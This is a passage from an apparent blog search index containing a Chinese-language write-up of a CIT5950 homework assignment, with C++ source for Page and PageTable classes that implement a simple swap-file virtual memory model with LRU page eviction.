virtual_pno_) return 0; virtual_address = virtual_address % PAGE_SIZE; T* address = (T*)(bytes_ + virtual_address); return *address; } // This function allows users to write various data types // to the page. Trying to write a non-primitive type or use // a virtual address that doesn't map to this page results // in undefined behaviour. You can also assume that // anything being written fits on the current page // is not partially on another page. // If you are familiar with endianness, it shouldn't be // considered for this function. // // Arguments: // - virtual_address: a virtual address that maps somewhere // into the page, where we will read data of type T // - to_write: the data of type T to write to the page // // Returns: nothing template \u003ctypename T\u003e void Page::store(uint32_t virtual_address, const T\u0026 to_write) { if(virtual_address / PAGE_SIZE != virtual_pno_) return; virtual_address = virtual_address % PAGE_SIZE; T* address = (T*)(bytes_ + virtual_address); *address = to_write; dirty_ = true; } } ","date":"2024-01-04","objectID":"/cit5950_hw3/:4:3","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#pagetemplatescc实现"},{"categories":["系统入门"],"content":" 4.4 Page.h定义Page.h在simplevm namespace中。源码如下: cpp #ifndef PAGE_H_ #define PAGE_H_ #include \u003ccstdint\u003e #include \u003cfstream\u003e using std::fstream; namespace simplevm { // defines the type pno_t, which is the type // that represents a page number typedef uint32_t pno_t; /////////////////////////////////////////////////////////////////////////////// // A Page is a class that represents a page of memory // in our simple virtual memory model. // If a page object exists, then we say that the page is loaded // into physical memory. When the page object doesn't exist, then its // data is stored in the swap_file. When we load in a page to // \"physical memory\", we are creating the page and we read the page's data // from the swap file. A page's data in the swap file starts at // virtual_pno * Page::PAGE_SIZE // // This Class manages a page's worth of data // Users can access or store data, sa well as flush the data in the // page to the specified swap file. A swap file is where exceess virtual // memory is stored when it can't fit in physical memory. /////////////////////////////////////////////////////////////////////////////// class Page { public: // Constructs a new Page object associated // with a swap_file and a virtual page number. // The swap file is where we will load in the page // contents and flush the page contents. The virtual // page number decides where in that file we read // and write this page. // Passing in an invalid page number is undefined behaviour // Note that a Page does not have ownership // of the swap_file_, just access to it. // // Arguments: // - swap_file the swap_file associated with the page // - the virtual page number of our new page Page(fstream\u0026 swap_file, pno_t virtual_pno); // Constructs a new Page object that is a copy of // another page object. Both pages will have // the same page number and swap_file, but should // have independent copies of the page data. // // Misc: this means that there could be issues with // having the original and copy page having differnt // data. This cctor should only really be used // in the context of managing pages with something // like STL, where the original page used for the cctor // will be discarded. In real C++, we would want to // use move semantics here. // // Arguements: // - other: the page we are copying Page(const Page\u0026 other); // Destructor for the page object // Cleans up any dynamically allocated data or // otherwise allocated resources AND should flush // its contents if the page is dirty at time of // destruction. ~Page(); // Set the current Page object so that is a copy of // another page object. Both pages will have // the same page number and swap_file, but should // have independent copies of the page data. // // Misc: this means that there could be issues with // having the original and copy page having differnt // data. This op= should only really be used // in the context of managing pages with something // like STL, where the original page used for the cctor // will be discarded. In real C++, we would want to // use move semantics here. // // You can assume each page has the same swap_file. // // Arguements: // - rhs: the page we are copying Page\u0026 operator=(const Page\u0026 rhs); // This function is not required, but you may add it // if it is needed for some of the STL containers // you use in PageTable // // Determines if this page should go before another page if they // were in sorted order. // // Arguments: // - rhs: the Page we are comparing this to // // Returns: true iff this page would show up before the other // page in sorted order. False otherwise. bool operator\u003c(const Page\u0026 rhs); // This function allows users to read various data types // from the page. Trying to read a non-primitive type or use // a virtual address that doesn't map to this page results // in undefined behaviour. You can also assume that // anything being read fits in on the page we are reading // is not partially on another page. // If you are familiar with endianness, i","date":"2024-01-04","objectID":"/cit5950_hw3/:4:4","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#pageh定义"},{"categories":["系统入门"],"content":" 4.5 Page.cc实现Page.cc在simplevm namespace中。源码如下: cpp #include \"./Page.h\" #include \u003cfstream\u003e #include \u003ciostream\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e namespace simplevm { // TODO: implement all non template member functions for Page // Constructs a new Page object associated // with a swap_file and a virtual page number. // The swap file is where we will load in the page // contents and flush the page contents. The virtual // page number decides where in that file we read // and write this page. // Passing in an invalid page number is undefined behaviour // Note that a Page does not have ownership // of the swap_file_, just access to it. // // Arguments: // - swap_file the swap_file associated with the page // - the virtual page number of our new page Page::Page(fstream\u0026 swap_file, pno_t virtual_pno):swap_file_(swap_file) { this-\u003evirtual_pno_ = virtual_pno; this-\u003ebytes_ = new uint8_t[PAGE_SIZE]; // seek the correct position swap_file_.seekg(virtual_pno_ * PAGE_SIZE, std::ios::beg); // read from the swap file swap_file_.read((char*)bytes_,PAGE_SIZE); if(!swap_file_) { std::cerr \u003c\u003c \"Swap file read failed!\" \u003c\u003c std::endl; exit(1); } this-\u003edirty_ = false; } // Constructs a new Page object that is a copy of // another page object. Both pages will have // the same page number and swap_file, but should // have independent copies of the page data. // // Misc: this means that there could be issues with // having the original and copy page having differnt // data. This cctor should only really be used // in the context of managing pages with something // like STL, where the original page used for the cctor // will be discarded. In real C++, we would want to // use move semantics here. // // Arguements: // - other: the page we are copying Page::Page(const Page\u0026 other):swap_file_(other.swap_file_) { this-\u003evirtual_pno_ = other.virtual_pno_; this-\u003ebytes_ = new uint8_t[PAGE_SIZE]; memcpy(this-\u003ebytes_,other.bytes_,PAGE_SIZE); this-\u003edirty_ = other.dirty_; } // Destructor for the page object // Cleans up any dynamically allocated data or // otherwise allocated resources AND should flush // its contents if the page is dirty at time of // destruction. Page::~Page() { if(dirty_) { flush(); } dirty_ = false; delete[] bytes_; } // Set the current Page object so that is a copy of // another page object. Both pages will have // the same page number and swap_file, but should // have independent copies of the page data. // // Misc: this means that there could be issues with // having the original and copy page having differnt // data. This op= should only really be used // in the context of managing pages with something // like STL, where the original page used for the cctor // will be discarded. In real C++, we would want to // use move semantics here. // // You can assume each page has the same swap_file. // // Arguements: // - rhs: the page we are copying Page\u0026 Page::operator=(const Page\u0026 rhs) { if (this!=\u0026rhs) { this-\u003e~Page(); new (this)Page(rhs); } return *this; } // This function is not required, but you may add it // if it is needed for some of the STL containers // you use in PageTable // // Determines if this page should go before another page if they // were in sorted order. // // Arguments: // - rhs: the Page we are comparing this to // // Returns: true iff this page would show up before the other // page in sorted order. False otherwise. bool Page::operator\u003c(const Page\u0026 rhs) { return this-\u003evirtual_pno_ \u003c rhs.virtual_pno_; } // Returns the virtual page number of this page // // Arguments: None // // Returns: this page's virtual page number pno_t Page::pno() { return this-\u003evirtual_pno_; } // Returns whether or not a page is dirty // A page is \"dirty\" if someone has written to the data managed // by the page since the last time the page was flush()'d. // // Arguments: None // // Returns: Whether this page is dirty or not bool Page::dirty() { return this-\u003edirty_; } // Flushes the page to the swap file if it is dirty. // Flushing a page to the sw","date":"2024-01-04","objectID":"/cit5950_hw3/:4:5","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#pagecc实现"},{"categories":["系统入门"],"content":" 5 PageTable实现","date":"2024-01-04","objectID":"/cit5950_hw3/:5:0","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#pagetable实现"},{"categories":["系统入门"],"content":" 5.1 PageTable 源码分析PageTable 的作用如下： 管理一个进程的地址空间 包括swap_file 从 physical memory 中读取页 选择页淘汰，进行页替换 PageTable.cc中有如下一些方法： PageTable(std::string swap_file_name, size_t page_capacity); 初始化页表，制定swap_file名称和页容量 存储的页不可超过页容量 ~PageTable(); 清理所有变量 flush dirty pages Page\u0026 get_page(uint32_t virtual_address); 返回一个虚拟地址对应的 page 将该页导入 physical memory 返回它 有几种可能情况 该页在 Physical memory 中，返回对应的页的引用，并且将该页标记为最新（挪到 vector 最前） 该页不在 physical memory 中，并且 physical memory 还没满。那么将其导入 physical memory，并且标记为最新（挪到 vector 最前），返回该页引用 该页不在 Physical memory 中，并且 physical memory 已经满了，那么先执行淘汰算法，淘汰最老的页，将其写入swap_file。然后将该页从swap_file中导入进来，放在 vector 最前 注意： virtual address != 页号，可能有多个 virtual address 对应同一个页号(一页有 4096 个字节嘛) 页的最新和最老完全取决于get_page函数的调用情况 size_t capacity(); 返回页容量 size_t loaded_pages(); 返回导入 physical memory 的页数目 bool page_available(pno_t virtual_pno); 返回对应页是否存在 physical memory 中 void flush_all_pages(); 将所有页都刷新到swap_file中 void flush_page(pno_t virtual_pno); 将对应的页刷新到swap_file中 void discard_page(pno_t virtual_pno); 从页表中丢弃对应的页。如果该页不存在，则返回。否则，若该页为 dirty，则将该页数据写入swap_file，然后丢弃它 void evict_page(); 若没有 page 在页表中，则什么也不做。否则丢弃最老的一页（丢弃前记得将其写入swap_file） PageTable.cc有两个private变量： fstream swap_file_: 交换文件 size_t capacity: 页容量 size_t page_num: 当前已经导入 physical memory 的页数目 std::vector\u003cPage*\u003e page_list: 记录所有在 physical memory 中的页 std::unordered_map\u003cpno_t,Page*\u003e mp: ","date":"2024-01-04","objectID":"/cit5950_hw3/:5:1","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#pagetable-源码分析"},{"categories":["系统入门"],"content":" 5.2 PageTable.h设计 cpp #ifndef PAGE_TABLE_H_ #define PAGE_TABLE_H_ #include \u003cfstream\u003e #include \u003ccstdint\u003e // #include \u003cvector\u003e #include \u003cunordered_map\u003e #include \u003clist\u003e #include \"./Page.h\" using std::fstream; namespace simplevm { /////////////////////////////////////////////////////////////////////////////// // A PageTable manages a processes memeory for our simplified // virtual memory model. This involves managing a swap_file // which is where pages of data are stored when they aren't loaded // into physical memory. For our software model, we will say a page // is in \"physical memory\" if it is loaded into our memory space // (e.g. it is on the heap). Pages that aren't loaded in will have // their contents stored in the swap_file and will not have an // associated Page object (see Page.h). Our page table can only have // so many pages stored in memory at one time, which is specified // on PageTable Creation. We implement an LRU page replacement // policy to decide which pages to evict if we need to load a new page // and we already have reached our capacity on the numberof pages we can // hold. // // Users can get a page from the cache, flush pages to the swap_file, // request any page is evicted, and specifically ask for a page to be evicted. /////////////////////////////////////////////////////////////////////////////// class PageTable { public: // Constructs a new page table with the specified // swap file and the specified page capacity, which is // the number of pages that can be held in memory // at one time. There cannot be more than page_capacity // number of pages loaded in at a time. // // Arguments: // - swap_file_name: the name of the swap_file // - page_capacity: the maximum number of pages that can be held // in memory at one time. PageTable(std::string swap_file_name, size_t page_capacity); // Destructs the page table, freeing any allocated resources // and flushing any pages currently loaded into memory that // are dirty ~PageTable(); // Given a virtual address, gets the associated // page for that virtual address. This page will // be \"loaded\" into physical memory by the time it // is returned. // // There are three possiblities when a page is requested: // 1. The page is currently in the \"loaded\" and in the cache. // In this case, a reference to the page is returned and // and the page is marked as most recently used in the cache // 2. The page is not currently \"loaded\", and the PageTable // has not reached its page capacity: // In this case, the page is loaded from the swap file and added // to the cache as the most recently used page. // 3. The page is not currently \"loaded\", and the PageTable // is at page capacity: // The least recently used page in the cache is evicted from the // cache. Afterwards the requested page is loaded from the swap file // and added to the cache as the most recently used page. // // NOTE: What decides how recntly used a page was used is entirely // decided by how recntly it was returned by a call to get_page. // // Arguments: // - virtual_address: A virtual address that is associated // with a requested page. The virutal address is represented // as a unsigned 32 bit integer. NOTE: a virtual address // is NOT the same as a page number. Multiple virtual addresses // could be associated with the same page number. // // Returns: // - the requested page, which is loaded into the cache and // marked as the most recently used page Page\u0026 get_page(uint32_t virtual_address); // Returns the page capacity of the page table // // Arguments: None // // Returns: the page capacity of the page table size_t capacity(); // Returns the number of pages currently loaded into \"physical memory\" // // Arguments: None // // Returns: the number of pages currently loaded into \"physical memory\" size_t loaded_pages(); // Checks to see if the specified page is loaded into memory // // Arguments: The virtual page number of the page to check for // // Returns: True iff the page is loaded into memory, false othe","date":"2024-01-04","objectID":"/cit5950_hw3/:5:2","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#pagetableh设计"},{"categories":["系统入门"],"content":" 5.3 PageTable.cc实现 cpp #include \"./PageTable.h\" #include \"./Page.h\" namespace simplevm { // TODO: implment PageTable member functions // Constructs a new page table with the specified // swap file and the specified page capacity, which is // the number of pages that can be held in memory // at one time. There cannot be more than page_capacity // number of pages loaded in at a time. // // Arguments: // - swap_file_name: the name of the swap_file // - page_capacity: the maximum number of pages that can be held // in memory at one time. PageTable::PageTable(std::string swap_file_name, size_t page_capacity) { swap_file_.open(swap_file_name); this-\u003ecapacity_ = page_capacity; this-\u003epage_num = 0; } // Destructs the page table, freeing any allocated resources // and flushing any pages currently loaded into memory that // are dirty PageTable::~PageTable() { while(page_num \u003e 0) { Page* deleted_page = page_list.back().second; page_list.pop_back(); deleted_page-\u003e~Page(); page_num -= 1; } mp.clear(); page_list.clear(); } // Given a virtual address, gets the associated // page for that virtual address. This page will // be \"loaded\" into physical memory by the time it // is returned. // // There are three possiblities when a page is requested: // 1. The page is currently in the \"loaded\" and in the cache. // In this case, a reference to the page is returned and // and the page is marked as most recently used in the cache // 2. The page is not currently \"loaded\", and the PageTable // has not reached its page capacity: // In this case, the page is loaded from the swap file and added // to the cache as the most recently used page. // 3. The page is not currently \"loaded\", and the PageTable // is at page capacity: // The least recently used page in the cache is evicted from the // cache. Afterwards the requested page is loaded from the swap file // and added to the cache as the most recently used page. // // NOTE: What decides how recntly used a page was used is entirely // decided by how recntly it was returned by a call to get_page. // // Arguments: // - virtual_address: A virtual address that is associated // with a requested page. The virutal address is represented // as a unsigned 32 bit integer. NOTE: a virtual address // is NOT the same as a page number. Multiple virtual addresses // could be associated with the same page number. // // Returns: // - the requested page, which is loaded into the cache and // marked as the most recently used page Page\u0026 PageTable::get_page(uint32_t virtual_address) { // obtain the virtual_pno according to the virtual address pno_t pno = virtual_address / Page::PAGE_SIZE; if(page_available(pno)) { Page* p = mp[pno]; page_list.remove(std::make_pair(pno,p)); page_list.push_front(std::make_pair(pno,p)); return *p; } else { Page* pg = new Page(swap_file_,pno); if(page_num \u003c capacity_) { page_list.push_front(std::make_pair(pno,pg)); flush_page(pno); page_num += 1; } else { // LRU Algorithms // evict the oldest page, and flush it evict_page(); // add the new page to the front of the list page_list.push_front(std::make_pair(pno,pg)); page_num += 1; } mp[pno] = pg; return *(mp[pno]); } } // Returns the page capacity of the page table // // Arguments: None // // Returns: the page capacity of the page table size_t PageTable::capacity() { return capacity_; } // Returns the number of pages currently loaded into \"physical memory\" // // Arguments: None // // Returns: the number of pages currently loaded into \"physical memory\" size_t PageTable::loaded_pages() { return page_num; } // Checks to see if the specified page is loaded into memory // // Arguments: The virtual page number of the page to check for // // Returns: True iff the page is loaded into memory, false otherwise bool PageTable::page_available(pno_t virtual_pno) { return mp.find(virtual_pno) != mp.end(); } // Makes sure that all currently loaded pages are flushed // meaning tha the page contents are updated on the swap file. // This should not affect how recently","date":"2024-01-04","objectID":"/cit5950_hw3/:5:3","series":["CIT5950"],"tags":["虚拟内存"],"title":"CIT5950_HW3","uri":"/cit5950_hw3/#pagetablecc实现"}]